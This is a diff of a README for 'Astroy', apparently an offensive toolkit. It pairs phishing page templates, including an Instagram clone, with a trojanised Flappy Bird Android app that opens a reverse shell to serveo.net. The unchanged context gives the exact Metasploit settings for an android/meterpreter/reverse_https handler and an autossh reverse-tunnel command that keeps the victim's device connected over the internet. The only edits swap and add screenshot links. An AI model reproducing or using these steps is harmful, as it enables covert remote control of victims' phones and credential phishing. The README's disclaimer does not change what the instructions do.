@@ -26,7 +26,7 @@ The web templates include a normal sign up page, and an Instagram clone. The rea
 
 The Flappy Bird game is hardcoded with the LHOST ``serveo.net`` and LPORT ``2345``, therefore, anyone can use it with these values. On Metasploit, run ``set lhost localhost`` and ``set lport 2345`` and ``set payload android/meterpreter/reverse_https`` to configure the multi handler. Just make sure you run ``autossh -tt -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -R 2345:localhost:2345 serveo.net`` to forward TCP connections to your machine, and your payload will connect over WAN, only ever disconnecting if you terminate it.
 
-![](resources/metasploit.png)
+![](resources/meterpreter.png)
 
 Astroy only serves as a proof of concept on what black hat hackers can achieve if they get creative. I take no responsibility whatsoever for any usage of the tool for any illegal activities by anyone else.
 
@@ -95,6 +95,8 @@ Depending on how you invoke Python 3 on your system, run this command to install
 ```sh
 python3 -m pip install -r requirements.txt
 ```
+
+![](resources/requirements.png)
 
 Finally, run the setup script. This simply checks whether you have internet, whether the packages it needs are installed, whether you provided any ports as arguments and finally creates an ``astroy`` file at ``/usr/bin/`` which can be run globally from any directory. This setup script can be run without arguments like this:
 
